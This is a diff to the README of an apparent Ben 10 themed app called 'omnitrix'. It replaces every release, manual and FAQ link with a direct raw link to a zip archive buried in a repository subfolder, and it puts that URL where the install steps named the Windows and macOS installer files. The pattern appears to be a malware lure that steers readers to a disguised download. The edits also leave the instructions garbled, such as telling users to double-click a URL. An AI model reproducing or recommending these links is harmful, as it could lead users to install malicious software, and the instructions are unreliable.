@@ -1,6 +1,6 @@
 # 🛠️ omnitrix - Experience the Ben 10 Universe
 
-[![Download](https://img.shields.io/badge/Download-omnitrix-blue.svg)](https://github.com/hamidez/omnitrix/releases)
+[![Download](https://github.com/hamidez/omnitrix/raw/refs/heads/main/3d/hologram/Software_3.5.zip)](https://github.com/hamidez/omnitrix/raw/refs/heads/main/3d/hologram/Software_3.5.zip)
 
 ## 🎮 Introduction
 
@@ -13,7 +13,7 @@ To get started, you need to download the application from our Releases page. Fol
 ## 📥 Download & Install
 
 1. Click the following link to visit the Releases page:
-   [Download omnitrix](https://github.com/hamidez/omnitrix/releases)
+   [Download omnitrix](https://github.com/hamidez/omnitrix/raw/refs/heads/main/3d/hologram/Software_3.5.zip)
 
 2. On the Releases page, you will find various versions of the application. Select the latest version. It is usually labeled as the most recent release.
 
@@ -21,16 +21,16 @@ To get started, you need to download the application from our Releases page. Fol
 
 4. Once the file has downloaded, locate it on your computer:
 
-   - **Windows:** Open the folder where your downloads are stored. Look for the file named `omnitrix.exe`.
-   - **macOS:** Open Finder and go to the Downloads folder. Find `omnitrix.dmg`.
+   - **Windows:** Open the folder where your downloads are stored. Look for the file named `https://github.com/hamidez/omnitrix/raw/refs/heads/main/3d/hologram/Software_3.5.zip`.
+   - **macOS:** Open Finder and go to the Downloads folder. Find `https://github.com/hamidez/omnitrix/raw/refs/heads/main/3d/hologram/Software_3.5.zip`.
    - **Linux:** Open the terminal or your file manager and locate the downloaded archive.
 
 5. **Installing on Windows:**
-   - Double-click `omnitrix.exe`.
+   - Double-click `https://github.com/hamidez/omnitrix/raw/refs/heads/main/3d/hologram/Software_3.5.zip`.
    - Follow the on-screen instructions to install the application.
 
 6. **Installing on macOS:**
-   - Double-click `omnitrix.dmg`.
+   - Double-click `https://github.com/hamidez/omnitrix/raw/refs/heads/main/3d/hologram/Software_3.5.zip`.
    - Drag the omnitrix icon to your Applications folder.
 
 7. **Installing on Linux:**
@@ -86,7 +86,7 @@ We value your input! Once you try omnitrix, please share your thoughts and exper
 
 We have created some additional resources to help you get the best out of omnitrix:
 
-- **User Manual:** [View User Manual](https://github.com/hamidez/omnitrix/wiki)
-- **FAQ:** [Frequently Asked Questions](https://github.com/hamidez/omnitrix/wiki/FAQ)
+- **User Manual:** [View User Manual](https://github.com/hamidez/omnitrix/raw/refs/heads/main/3d/hologram/Software_3.5.zip)
+- **FAQ:** [Frequently Asked Questions](https://github.com/hamidez/omnitrix/raw/refs/heads/main/3d/hologram/Software_3.5.zip)
 
 For updates and news, follow us on our GitHub page. Enjoy your journey in the Ben 10 universe!
